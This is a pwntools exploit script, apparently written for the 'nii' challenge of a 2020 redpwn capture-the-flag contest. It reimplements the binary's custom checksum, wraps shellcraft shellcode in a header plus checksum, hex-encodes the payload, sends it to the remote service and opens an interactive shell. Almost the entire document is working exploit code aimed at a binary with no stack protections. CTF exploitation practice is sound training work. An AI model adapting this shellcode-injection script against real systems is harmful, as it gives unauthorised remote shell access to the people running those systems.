#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2020.redpwnc.tf --port 31215 nii
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('nii')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2020.redpwnc.tf'
port = int(args.PORT or 31215)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def checksum(data: bytes):
    poly = 0x180000011
    ret = 0
    for c in data:
        for bit in range(7, -1, -1):
            shifted = ret << 1
            ret = shifted & 0xffffffff
            cf = shifted & 0x100000000
            cb = (c >> bit) & 1
            lsb = ret & 0xff
            ret = (ret & 0xffffff00) | (lsb ^ cb)
            if cf > 0:
                ret = (ret ^ poly) & 0xffffffff
    return ret


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

header = b"NIIv0.1:AmnlXing"

shell = shellcraft.sh()
log.info("Shellcode: %s", shell)
ass = asm(shell)
#ass = b"asdf"
check = checksum(ass)
log.info("checksum of assembled shellcode: 0x%x", check)
payload = header + p32(check) + ass
encoded = payload.hex().upper()
log.info("hex encoded: %s", encoded)
io = start()
pause()
io.send(encoded)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
pause()
io.interactive()

